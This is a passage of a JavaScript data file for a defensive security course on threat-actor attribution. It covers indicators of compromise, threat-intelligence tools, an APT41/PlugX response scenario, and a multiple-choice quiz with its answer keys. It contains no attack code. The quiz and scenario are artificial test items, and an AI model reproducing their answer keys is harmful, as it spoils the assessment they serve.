                'Threat intelligence sharing: report IOCs, TTPs, and campaign details to your sector ISAC (FS-ISAC, H-ISAC, etc.) and platforms like MISP. Collective defense improves detection for everyone in the community',
                'Hunt-forward operations: after containing the immediate threat, proactively hunt for additional indicators of the same actor across your environment. Nation-state actors often have multiple access vectors and will attempt to re-enter through a different path',
                'Strategic debrief: update your threat model based on what you learned. If you were targeted by a nation-state, your security posture and budget requirements have permanently changed.'
            ]
        },
        indicators: {
            network: [
                'Known C2 infrastructure: connections to IP addresses and domains listed in threat intelligence feeds as belonging to specific threat groups (cross-reference with VirusTotal, OTX, Recorded Future)',
                'TTP-consistent network patterns: nation-states use DNS tunneling and domain fronting; ransomware groups use Tor and bulletproof hosting; hacktivists use booter/stresser DDoS services',
                'Infrastructure reuse: threat actors often reuse SSL certificates, domain registrar patterns, WHOIS details, or hosting providers across campaigns — enabling clustering even without malware samples',
                'Geographic anomalies: authentication or data flow from countries matching known threat actor origins (Russia, China, North Korea, Iran) when your organization has no business presence there',
                'Protocol-level TTPs: specific HTTP headers, JA3/JA3S fingerprints, or beacon timing patterns that match known malware families associated with particular threat groups'
            ],
            host: [
                'Malware family signatures: specific implants associated with known groups — Cobalt Strike (widespread, used by both criminals and APTs), PlugX (Chinese APTs), Emotet (cybercrime ecosystem), Mimikatz (credential dumping, nearly universal)',
                'Tooling fingerprints: compiler artifacts, debug strings, language-specific patterns, or coding conventions that link samples to specific development teams or regions',
                'Persistence patterns: nation-states favor firmware implants, WMI subscriptions, and DLL sideloading; criminals prefer scheduled tasks and registry keys; insiders rarely install persistence (they already have access)',
                'Anti-forensic techniques: level of sophistication in covering tracks reveals actor capability — script kiddies leave everything; nation-states timestomp files, clear logs, and use encrypted containers',
                'Lateral movement tools: specific combinations reveal actor class — BloodHound + Rubeus + Cobalt Strike (professional red team / advanced actor) vs. mass exploitation with default credentials (script kiddie)'
            ],
            behavioral: [
                'Targeting patterns: who and what the actor targets reveals identity — defense contractors (nation-state), healthcare billing systems (financial crime), organizations criticized on social media (hacktivist), specific projects or individuals (insider)',
                'Operational timing: attacks during the actor\'s local business hours (UTC+8 suggests East Asian origin, UTC+3 suggests Eastern European). Some nation-state groups work Mon-Fri and observe national holidays',
                'Campaign tempo: nation-states operate slowly and carefully over months; ransomware gangs work in rapid 48-72 hour blitzes; hacktivists surge around political events and then go quiet',
                'Infrastructure investment: disposable cloud instances (low investment, criminal or hacktivist) vs. long-lived, carefully maintained C2 networks (high investment, nation-state)',
                'Post-compromise behavior: data exfiltration (espionage), ransomware deployment (financial), website defacement (hacktivist), nothing stolen but access maintained (pre-positioning for future conflict)'
            ],
            tools: ['MITRE ATT&CK Groups', 'Recorded Future', 'Mandiant Threat Intelligence', 'CrowdStrike Adversary Universe', 'VirusTotal', 'MISP (Malware Information Sharing Platform)', 'Diamond Model tooling', 'AlienVault OTX', 'Shodan', 'GreyNoise']
        },
        interactive: {
            scenario: 'Your SOC receives three alerts in 24 hours: (1) An employee at your defense contractor company receives a LinkedIn message from a "recruiter" with a PDF attachment — EDR flags the PDF as containing a known PlugX RAT variant. (2) The same day, your external threat intel feed reports that APT41 has been targeting defense contractors in your region using LinkedIn-based spear phishing with PlugX payloads. (3) Firewall logs show outbound connections from the employee\'s workstation to an IP address in a cloud hosting provider that your threat intel correlates with APT41 infrastructure. What is the threat actor classification, and how does this change your response?',
            options: [
                'It\'s a random phishing attempt — quarantine the email and scan the workstation',
                'This is a targeted nation-state operation (APT41 / Chinese state-sponsored). The LinkedIn vector, PlugX malware family, defense contractor targeting, and correlated C2 infrastructure all point to APT41 with high confidence. Response escalation: (1) treat this as a national security incident — notify your FSO and DCSA, (2) assume the single detected endpoint is NOT the only compromise — hunt across ALL systems for PlugX indicators, (3) engage a threat intelligence firm with APT41 expertise for attribution confirmation, (4) do NOT simply reimage and move on — nation-state actors maintain multiple access vectors and WILL return, (5) review all LinkedIn connections and messages to this employee and similar roles, (6) report to FBI Cyber Division and CISA.',
                'It\'s an insider who installed the malware — investigate the employee',
                'Block the IP and move on — the antivirus caught it'
            ],
            correct: 1,
            explanation: 'Three independent data points converge: (1) PlugX is a malware family almost exclusively associated with Chinese APT groups, (2) active threat intel on APT41 targeting your sector with the exact same TTP (LinkedIn + PlugX), and (3) C2 infrastructure correlation. This is high-confidence attribution. The response is fundamentally different from a criminal attack — nation-state actors have multiple access vectors (the LinkedIn phishing may be one of several simultaneous approaches), they are persistent (they will re-target you), and the data they seek (defense contractor IP) has national security implications. Simply reimaging the one detected endpoint and blocking one IP address would leave other potential compromises in place.'
        },
        quiz: [
            { question: 'What makes Lazarus Group (North Korea) unique among nation-state APT groups?', options: ['They only target military systems', 'They combine traditional espionage operations with financially motivated attacks (bank heists, cryptocurrency theft) to generate revenue for the DPRK regime — blurring the line between state espionage and cybercrime', 'They only use open-source tools', 'They exclusively use zero-day exploits'], correct: 1, explanation: 'Most nation-state APTs focus purely on espionage or sabotage. Lazarus is unique because North Korea uses cyber operations as a revenue source, stealing billions in cryptocurrency and conducting bank heists (Bangladesh Bank, $81M) to fund the regime. This dual-purpose mission makes their targeting unusually broad.' },
            { question: 'How did the Lapsus$ group bypass advanced security controls at companies like Microsoft and Okta?', options: ['They used zero-day exploits', 'They exploited network vulnerabilities', 'They primarily used social engineering, SIM swapping, and MFA fatigue attacks — targeting humans rather than technology, which proved effective even against organizations with sophisticated technical defenses', 'They had insider access at every target'], correct: 2, explanation: 'Lapsus$ (teenagers, ages 16-21) demonstrated that the human element remains the weakest link regardless of how advanced your technical security is. They called help desks to reset credentials, SIM-swapped employees\' phone numbers to intercept MFA codes, and repeatedly pushed MFA prompts until exhausted users approved. No zero-days needed.' },
            { question: 'Why is attribution (determining who conducted an attack) so difficult in cybersecurity?', options: ['Because attackers don\'t use computers', 'Because sophisticated actors use false flags (planting other groups\' tools), shared/open-source tooling, compromised third-party infrastructure, and strong operational security — making technical evidence alone often insufficient for confident attribution', 'Because all attacks come from the same country', 'Because logs are never available'], correct: 1, explanation: 'Attribution is hard because: (1) tools are shared — Cobalt Strike is used by nation-states, criminals, and red teams, (2) false flags — Russian actors have planted Chinese malware to mislead investigators, (3) infrastructure is laundered — attacks route through compromised servers in neutral countries, (4) cleanup — sophisticated actors destroy forensic evidence. High-confidence attribution often requires signals intelligence or law enforcement, not just technical analysis.' },
            { question: 'What behavioral indicator MOST strongly suggests a nation-state actor rather than a cybercriminal?', options: ['Using encrypted communications', 'Slow, patient operations over months with focus on data exfiltration and persistent access rather than immediate monetization — nation-states invest time for strategic intelligence, while criminals work on rapid 48-72 hour ransomware timelines', 'Attacking on weekdays', 'Using malware'], correct: 1, explanation: 'Tempo and objectives are the strongest differentiators. Nation-states invest months in reconnaissance, move slowly through networks to avoid detection, and focus on intelligence collection. Criminals need rapid ROI — they deploy ransomware within days of initial access because every hour increases detection risk. Patience is a luxury only state-funded actors can afford.' },
            { question: 'Which threat actor category is responsible for approximately 25% of all data breaches?', options: ['Script kiddies', 'Hacktivists', 'Insider threats — current or former employees, contractors, or partners who misuse their authorized access, whether through malicious intent or negligent behavior', 'Nation-state actors'], correct: 2, explanation: 'Verizon\'s DBIR consistently shows ~25% of breaches involve internal actors. Insiders are dangerous because they already have authenticated access, know where valuable data lives, and can bypass external-facing security controls. Insider threats include both intentional theft (Edward Snowden, corporate espionage) and negligent actions (misconfigured S3 buckets, emailed spreadsheets).' },
            { question: 'What is the Diamond Model of Intrusion Analysis used for?', options: ['Rating malware severity', 'It maps the four core features of any intrusion — adversary, capability, infrastructure, and victim — to structure analysis and support attribution by identifying relationships between these elements across multiple incidents', 'Encrypting network traffic', 'Classifying vulnerabilities by CVSS score'], correct: 1, explanation: 'The Diamond Model provides a structured framework for intrusion analysis: every attack involves an Adversary using a Capability (tools/techniques) over Infrastructure (C2 servers, domains) against a Victim. By analyzing and correlating these four vertices across incidents, analysts can cluster attacks, track campaigns, and build attribution cases — even when the adversary tries to hide behind false flags and shared tooling.' }
        ]
    }
};
